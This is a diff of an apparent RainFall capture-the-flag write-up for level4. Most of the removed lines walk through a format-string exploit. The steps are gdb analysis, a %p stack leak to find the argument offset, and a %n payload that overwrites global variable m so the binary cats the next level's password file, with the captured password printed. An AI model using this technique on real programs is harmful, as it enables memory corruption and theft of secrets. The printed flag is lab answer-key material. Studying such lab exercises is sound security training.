@@ -1,16 +1,3 @@
-_basic binary test_
-```
-level4@RainFall:~$ ./level4 
-
-level4@RainFall:~$ ./level4 test
-
-level4@RainFall:~$ ./level4
-test
-test
-```
-
-_using gdb_
-```
 level4@RainFall:~$ gdb ./level4 
 GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
 Copyright (C) 2012 Free Software Foundation, Inc.
@@ -98,13 +85,6 @@ Dump of assembler code for function n:
    0x080484a5 <+78>:	leave  
    0x080484a6 <+79>:	ret    
 End of assembler dump.
-```
-_main is only calling n. n is using fgets and system and call p. p call a printf. By analising strings and variables, we find a string with the call of the next pass, and a global variable(m) compared to 16930116, so same thing as level3:_
-```
-0x08048499 <+66>:    movl   $0x8048590,(%esp)
-  
-(gdb) x/s 0x8048590
-0x8048590: "/bin/cat /home/user/level5/.pass"
 
 (gdb) info variables
 All defined variables:
@@ -130,30 +110,3 @@ Non-debugging symbols:
 0x08049808  completed.6159
 0x0804980c  dtor_idx.6161
 0x08049810  m
-
-
-0x0804848d <+54>:	mov    0x8049810,%eax
-0x08048492 <+59>:	cmp    $0x1025544,%eax
-
-(gdb) print 0x1025544
-$2 = 16930116
-
-```
-_first we need to find the position of the argument_
-```
-level4@RainFall:~$ python -c 'print "AAAA" + " %p" * 16' | ./level4
-AAAA 0xb7ff26b0 0xbffff784 0xb7fd0ff4 (nil) (nil) 0xbffff748 0x804848d 0xbffff540 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520
-```
-> 0x41414141 is AAAA hex representation, so 12th arg
-
-_now we can create the payload with_
-_- \x10\x98\x04\x08 is the adress of m
-_- %16930112c%12$n to fill the buffer with empty character and %12n to print all characters into the 12th position arg
-_- and cat to keep the process
-
-```
-python -c 'print "\x10\x98\x04\x08" + "%16930112c%12$n"' | ./level4
-[...] 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
-```
->**DONE**
-
